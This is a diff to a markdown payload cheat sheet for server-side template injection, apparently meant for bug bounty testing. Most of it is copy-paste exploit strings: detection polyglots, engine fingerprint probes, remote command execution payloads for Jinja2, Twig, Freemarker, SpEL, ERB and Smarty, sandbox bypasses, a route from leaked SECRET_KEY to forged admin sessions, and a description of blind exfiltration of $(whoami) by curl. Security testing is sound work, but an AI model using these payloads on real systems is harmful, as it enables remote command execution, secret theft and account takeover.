@@ -1,11 +1,48 @@
 # SSTI Arsenal — Detection, Engine Fingerprint & Per-Engine RCE Payloads (copy-paste)
 
+**Author:** x8bitranjit
+
 > Companion to `SSTI_TESTING_GUIDE.md`. Authorized testing only — **benign markers**, clean up (Guide §18).
 > The finding is **server-side evaluation → RCE** (or sandboxed file-read/secret). A lone `{{7*7}}=49` is a FP (Guide §4/§15).
 
 ---
 
+## §0.0 — The whole attack in one sequence
+
+*What & when:* the entire SSTI run on one screen — the **decision spine** every section below plugs into. This is Kettle's methodology (Guide §21): **detect → confirm it's SERVER-SIDE (differential, not reflection/CSTI) → fingerprint the engine → climb THAT engine's reflection API to RCE → bypass the filter → one benign proof → stop.** Follow the arrows to the matching section.
+
+```
+# ── 1. RECON template sinks (Guide §3) ───────────────────────────────────
+name/subject/greeting/profile fields · error/notification templates · filenames · headers · anywhere input is RENDERED
+
+# ── 2. DETECT + confirm SERVER-SIDE (Guide §4) — the validity gate ────────
+polyglot:  ${{<%[%'"}}%\      → template error / odd output = engine present
+math:      {{1337*1338}} → 1788906   (differential: literal "1337*1338" must NOT come back = not reflection)
+NOT SSTI:  raw {{...}} reaches the browser + JS makes 49 = CSTI/XSS (wrong kit) · plain echo = reflection
+
+# ── 3. FINGERPRINT the engine (Guide §5) ─────────────────────────────────
+{{7*'7'}} → 7777777 = Jinja2/Python  |  49 = Twig/PHP  |  error = other
+${7*7}=49 → Freemarker/SpEL   ·   #{7*7} → Ruby/Thymeleaf   ·   <%= 7*7 %> → ERB/EJS   ·   {7*7} → Smarty
+
+# ── 4. ENGINE → RCE (Guide §7–§10) — pick the block for YOUR engine ───────
+Jinja2:     {{cycler.__init__.__globals__.os.popen('id').read()}}
+Twig:       {{['id']|filter('system')}}   ·   Freemarker: <#assign x="freemarker.template.utility.Execute"?new()>${x("id")}
+SpEL/OGNL:  ${T(java.lang.Runtime).getRuntime().exec("id")}   (Struts/Confluence = §21 real-world)
+ERB:        <%= `id` %>   ·   Smarty: {system('id')}   ·   Handlebars/Pug/EJS: constructor-chain (Guide §10)
+
+# ── 5. BLOCKED? filter/sandbox bypass (Guide §11) ────────────────────────
+'_'/'.'/'[]' blocked → |attr('\x5f\x5fclass\x5f\x5f') · request-object gadgets · {% %} tags · hex/unicode escapes
+
+# ── 6. PROVE benign, then STOP (Guide §12/§18) ───────────────────────────
+popen('id')/`id` = RCE = Critical.   Sandboxed? one rung down: {{config}} → SECRET_KEY → forge admin session (§17).
+```
+
+> **Cash-out map (Guide §16 severity):** differential-confirmed server-side eval → **RCE** (`id` = **Critical, CWE-1336→CWE-94**, the Struts/Confluence arc) → if sandboxed: **file read** / **`{{config}}` SECRET_KEY → admin-session forgery** (High) → SSRF/secret-disclosure from the box (§12). A lone `49` with no differential, or client-side `{{}}`? **Not SSTI** — don't report (Guide §15). Full worked run: **guide Appendix D**.
+
+---
+
 ## 1. Detection — DIFFERENTIAL (low false-positive) — Guide §4
+> **What & when:** your very first payloads. Fire these to answer one question — "did the *server* run my math?" — using numbers the page can't fake (`1337*1338`) plus a string-multiply that only a real engine does. Don't move past this section until one comes back computed.
 
 ```
 # numeric (use NON-round operands the page can't already contain):
@@ -16,7 +53,7 @@ ${1337*1338}         -> 1788906        (Freemarker/SpEL)
 {1337*1338}          -> 1788906        (Smarty)
 
 # string-multiply differentiator (separates real engine from coincidence):
-{{7*'7'}}            -> 7777777  (Jinja2/Twig)   |  49 (numeric engines)  |  error
+{{7*'7'}}            -> 7777777  (JINJA2 only — Python string-repeat)   |  49 (Twig/PHP & numeric engines)  |  error
 
 # multi-engine detection polyglot:
 ${{<%[%'"}}%\
@@ -26,10 +63,11 @@ ${{<%[%'"}}%\
 ```
 
 ## 2. Engine fingerprint branch — Guide §5
+> **What & when:** run this the moment detection confirms. It's the "which accent?" table — match how each probe comes back to one engine name, because the next section you use depends entirely on the answer.
 
 ```
-{{7*7}}=49 & {{7*'7'}}=7777777 & {{config}} renders            -> JINJA2 (Python)
-{{7*7}}=49 & {{7*'7'}}=7777777 & Twig filters/_self work       -> TWIG (PHP)
+{{7*7}}=49 & {{7*'7'}}=7777777 & {{config}} renders            -> JINJA2 (Python)  (7777777 = Python string-repeat, Jinja-only)
+{{7*7}}=49 & {{7*'7'}}=49 (numeric) & Twig filters/_self work  -> TWIG (PHP)  (Twig runs on PHP -> 7*'7'=49, NOT 7777777)
 ${7*7}=49 & ${"...".getClass()} / ?new() works                -> FREEMARKER (Java)
 ${T(java.lang.Runtime)...}=works                              -> SpEL / Thymeleaf (Java)
 <%= 7*7 %>=49                                                 -> ERB (Ruby) or EJS (Node)
@@ -39,6 +77,7 @@ ${T(java.lang.Runtime)...}=works                              -> SpEL / Thymelea
 ```
 
 ## 3. Python — Jinja2 (Guide §7)
+> **What & when:** use once you've fingerprinted Jinja2 (Flask). The RCE lines climb an object staircase to `os` and run `id`; if they're blocked, grab `{{config}}`→`SECRET_KEY` (forge sessions) or read a file. Try `cycler`/`lipsum` first — shortest and most reliable.
 
 ```
 {{7*7}}  {{7*'7'}}  {{config}}  {{config.items()}}  {{self}}
@@ -62,6 +101,7 @@ Tornado: {% import os %}{{ os.popen('id').read() }}
 ```
 
 ## 4. Java — Freemarker / Velocity / SpEL (Guide §8)
+> **What & when:** for `${...}` Java engines. Freemarker's `?new()` Execute is the reliable one; Spring/Thymeleaf reach `java.lang.Runtime.exec`. If the app is Struts/Confluence, jump to §8e (OGNL) instead — those are the unauth CVEs.
 
 ```
 Freemarker:
@@ -77,6 +117,7 @@ SpEL / Thymeleaf:
 ```
 
 ## 5. PHP — Twig / Smarty / Blade (Guide §9)
+> **What & when:** for PHP engines. Twig's `['id']|filter('system')` is the cleanest modern RCE; Smarty reaches the OS directly with `{system('id')}`; Blade only pops when user-supplied Blade is actually compiled (`Blade::render($userInput)`).
 
 ```
 Twig:
@@ -93,6 +134,7 @@ Blade (Laravel) — only where user Blade is eval'd / raw:
 ```
 
 ## 6. Ruby / Node (Guide §10)
+> **What & when:** for `<%= %>`/`#{}`/`{{ }}` Ruby & Node engines. ERB runs shell with backticks/`system`; every Node engine funnels to the same idea — reach `process.mainModule.require('child_process').execSync('id')` through whatever global the engine exposes.
 
 ```
 ERB (Ruby):   <%= `id` %>   <%= system('id') %>   <%= IO.popen('id').read %>
@@ -105,6 +147,7 @@ Handlebars:   (multi-step prototype payload — see PayloadsAllTheThings; reache
 ```
 
 ## 7. Sandbox escape hints (Guide §11)
+> **What & when:** reach for these when the engine is confirmed but `{{config}}`/`__class__` throw a sandbox error. You're finding the side exit the bouncer forgot — a different global, `|attr()` instead of a dot, or a smuggled token. Escaped sandbox = still Critical.
 
 ```
 Jinja2 (config/__class__ blocked):
@@ -116,6 +159,7 @@ Twig sandbox:
 ```
 
 ## 8. Blind — time & OOB (Guide §13)
+> **What & when:** use when your text renders somewhere you can't see (email/PDF/admin). You can't read the output, so make the server snitch: a `sleep` you can time, or a `curl` to your listener that proves eval and carries `$(whoami)` out.
 
 ```
 Jinja time:  {{ cycler.__init__.__globals__.os.popen('sleep 10').read() }}
@@ -212,6 +256,7 @@ Twig keyword filter    → {{ ['id']|filter('system') }} ·{{ ['id','']|sort('sy
 ```
 
 ## 9. Triage rules (don't waste a report)
+> **What & when:** the last gate before you hit submit — match your evidence to a row. If you land on a "NOT SSTI" row (lone `49`, client-side `{{}}`, tool-only), stop and go get the real proof first.
 
 ```
 differential server-side eval (1337*1338 & 7*'7') + engine + RCE   → REPORT Critical (benign id; clean up)
